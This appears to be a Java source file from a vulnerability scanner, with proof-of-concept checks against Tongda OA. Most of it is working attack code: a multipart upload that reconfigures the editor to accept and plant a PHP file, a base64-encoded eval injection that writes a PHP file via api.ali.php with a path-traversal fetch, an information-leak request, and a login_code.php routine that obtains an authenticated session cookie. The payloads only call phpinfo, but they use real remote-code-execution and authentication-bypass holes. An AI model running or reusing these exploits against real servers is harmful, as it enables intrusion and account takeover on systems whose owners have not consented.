package com.achuna33.Controllers;

import com.achuna33.SupportType.Poc_Exp;
import com.achuna33.SupportType.SupportVul;
import com.achuna33.Utils.Cache;
import com.achuna33.Utils.HttpRequest;
import com.achuna33.Utils.Response;

import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

@BasicMapping(uri = "通达")
public class TongDaController extends Controller implements BasicController{
    public TongDaController(){}

@VulnerabilityDescriptionMapping(Description = "通达OA v2014 get_contactlist.php 敏感信息泄漏漏洞",SupportVulType = SupportVul.信息泄露)
    public void vul_get_contactlist信息泄露(Poc_Exp type, String target,Object... args) throws MalformedURLException {
    Cache.uiController.logTextArea.appendText("\n开始检测：  vul_get_contactlist信息泄露");

    String url = "/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3";
    switch (type) {
        case EXP:
            WriteLog("\n vul_get_contactlist信息泄露 没有Exp");
        case POC:
            target = target + url;
            HttpRequest httpRequest = new HttpRequest(target);
            Response response = httpRequest.Get("");
            if (response.statusCode==200){
                WriteLog("\n vul_get_contactlist信息泄露 存在漏洞");
            }else {
                WriteLog("\n vul_get_contactlist信息泄露 不存在漏洞");
            }
    }
}
@VulnerabilityDescriptionMapping(Description = "通达OA v2017 action_upload.php 任意文件上传漏洞",SupportVulType =SupportVul.UploadFile )
    public void vul_action_upload文件上传(Poc_Exp type, String target,Object... args) throws MalformedURLException {
    Cache.uiController.logTextArea.appendText("\n开始检测：  vul_action_upload文件上传");

    String url = "/module/ueditor/php/action_upload.php?action=uploadfile";
    switch (type) {
        case EXP:
            WriteLog("\n vul_action_upload文件上传 没有Exp");
        case POC:
            String data = "-----------------------------55719851240137822763221368724\n" +
                    "Content-Disposition: form-data; name=\"CONFIG[fileFieldName]\"\n" +
                    "\n" +
                    "ffff\n" +
                    "-----------------------------55719851240137822763221368724\n" +
                    "Content-Disposition: form-data; name=\"CONFIG[fileMaxSize]\"\n" +
                    "\n" +
                    "1000000000\n" +
                    "-----------------------------55719851240137822763221368724\n" +
                    "Content-Disposition: form-data; name=\"CONFIG[filePathFormat]\"\n" +
                    "\n" +
                    "tcmd\n" +
                    "-----------------------------55719851240137822763221368724\n" +
                    "Content-Disposition: form-data; name=\"CONFIG[fileAllowFiles][]\"\n" +
                    "\n" +
                    ".php\n" +
                    "-----------------------------55719851240137822763221368724\n" +
                    "Content-Disposition: form-data; name=\"ffff\"; filename=\"test.php\"\n" +
                    "Content-Type: application/octet-stream\n" +
                    "\n" +
                    "<?php phpinfo();?>\n" +
                    "-----------------------------55719851240137822763221368724\n" +
                    "Content-Disposition: form-data; name=\"mufile\"\n" +
                    "\n" +
                    "submit\n" +
                    "-----------------------------55719851240137822763221368724--";

            HttpRequest httpRequest = new HttpRequest(target + url);
            httpRequest.addHeaders("Content-Type","multipart/form-data; boundary=---------------------------55719851240137822763221368724");
            Response response = httpRequest.Post("");

            HttpRequest httpRequest2 = new HttpRequest(target + "tcmd.php");
            Response response2 = httpRequest2.Get("");

            if (response.statusCode==200 && response2.statusCode==200){
                WriteLog("\n vul_action_upload文件上传 存在漏洞");
            }else {
                WriteLog("\n vul_action_upload文件上传 不存在漏洞");
            }
    }
}

@VulnerabilityDescriptionMapping(Description = "通达OA v11.5 login_code.php 任意用户登录",SupportVulType = SupportVul.信息泄露)
    public void vul_session泄露(Poc_Exp type, String target,Object... args) throws MalformedURLException {
    Cache.uiController.logTextArea.appendText("\n开始检测：  vul_session泄露");

    switch (type) {
        case EXP:
            WriteLog("\n vul_信息泄露漏洞 没有Exp");
        case POC:

    }
}
@VulnerabilityDescriptionMapping(Description = "通达OA v11.9 upsharestatus 后台SQL注入漏洞" ,SupportVulType = SupportVul.SQLInjection)
public void vul_upsharestatusSqlInjection(Poc_Exp type, String target,Object... args){
    switch (type) {
        case EXP:
            WriteLog("\n vul_upsharestatusSqlInjection 没有Exp");
        case POC:
            WriteLog("\n 漏洞需要相关参数，无法自动验证 http://www.i-dock.net/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.9%20upsharestatus%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html");
    }
}

@VulnerabilityDescriptionMapping(Description = "通达OA v11.8 api.ali.php 任意文件上传漏洞", SupportVulType = SupportVul.UploadFile)
public void vul_api_ali_UploadFile(Poc_Exp type, String target,Object... args) throws MalformedURLException {
    Cache.uiController.logTextArea.appendText("\n开始检测：  vul_api_ali_UploadFile");

    switch (type) {
        case EXP:
            WriteLog("\n vul_upsharestatusSqlInjection 没有Exp");
        case POC:
            String data = "\n" +
                    "--502f67681799b07e4de6b503655f5cae\n" +
                    "Content-Disposition: form-data; name=\"file\"; filename=\"fb6790f4.json\"\n" +
                    "Content-Type: application/octet-stream\n" +
                    "\n" +
                    "{\"modular\":\"AllVariable\",\"a\":\"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==\",\"dataAnalysis\":\"{\\\"a\\\":\\\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\\\"}\"}\n" +
                    "--502f67681799b07e4de6b503655f5cae--";
            HttpRequest httpRequest = new HttpRequest(target+"/mobile/api/api.ali.php");
            httpRequest.addHeaders("Content-Type","multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae");
            httpRequest.Post(data);

            HttpRequest httpRequest1 = new HttpRequest("");
            Response response = httpRequest1.Get(target+"/inc/package/work.php?id=../../../../../myoa/attach/approve_center/2109/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4");
            if (response.responseBody.contains("OK")){
                WriteLog("vul_api_ali_UploadFile 存在漏洞");
            }else {
                WriteLog("vul_api_ali_UploadFile 不存在漏洞");
            }

    }
}
public Boolean getV11Session(String target) throws MalformedURLException {
    try {
        String checkUrl = target + "/general/login_code.php";

        String resText = new HttpRequest(checkUrl).Get("").responseBody;
        String[] resTextSplit = resText.split("\\{", 2);
        String codeUid = resTextSplit[1].replace("}\"}", "").replace("\r\n", "");
        String data = "{\"CODEUID\":\"{" + codeUid + "},\"UID\":1\"}"; //{'CODEUID': '{'+codeUid+'}', 'UID': int(1)}；
        Response response = new HttpRequest(target + "/logincheck_code.php").Get("");

        //检测
        String tmp_cookie = response.responseHeader.get("Set-Cookie").toString();
        HttpRequest req = new HttpRequest(target + "/general/index.php");
        req.addHeaders("Cookie", tmp_cookie);
        Response response1 = req.Get("");

        if (response1.responseBody.contains("用户未登录")) {
            if (response1.responseBody.contains("重新登录")) {
                WriteLog("getV11Session 检测到漏洞 Session：" + tmp_cookie);
                return true;
            }
            return false;
        } else {
            WriteLog("getV11Session 未检测到漏洞 ");
            return false;
        }
    } catch (Exception e) {
        WriteLog("function getV11Session 出现异常");
        return false;
    }
}


    public static void main(String[] args) {
        List<String> test = new ArrayList<>();
        test.add("123");
        test.add("456");
        System.out.println(test);
    }
}
